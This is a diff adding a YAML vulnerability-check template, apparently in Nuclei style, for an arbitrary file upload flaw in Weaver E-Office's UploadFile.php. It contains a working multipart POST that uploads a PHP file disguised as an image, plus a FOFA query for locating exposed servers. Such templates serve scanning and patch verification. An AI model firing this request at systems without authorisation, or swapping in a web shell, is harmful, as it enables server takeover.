@@ -1,0 +1,43 @@
+id: 泛微OA E-Office UploadFile.php 任意文件上传漏洞
+time:  "2021-02-01"
+
+info:
+  severity: high
+  description:  在/general/index/UploadFile.php中上传文件过滤不严格导致允许无限制地上传文件，攻击者可以通过该漏洞直接获取网站权限
+  reference: https://peiqi.wgpsec.org/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20UploadFile.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-2021-49104.html
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= "
+    Rheader:
+      - Content-Type:multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4 & Cookie:LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348 & Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 & Accept-Encoding:gzip, deflate & Accept-Encoding:gzip, deflate
+        
+    body: 
+      - |
+        --e64bdf16c554bbc109cecef6451c26a4
+        Content-Disposition: form-data; name="Filedata"; filename="test.php"
+        Content-Type: image/jpeg
+
+        <?php phpinfo();?>
+
+        --e64bdf16c554bbc109cecef6451c26a4--
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "logo-eoffice.php"
+
+      - type: status
+        status:
+          - 200
+    
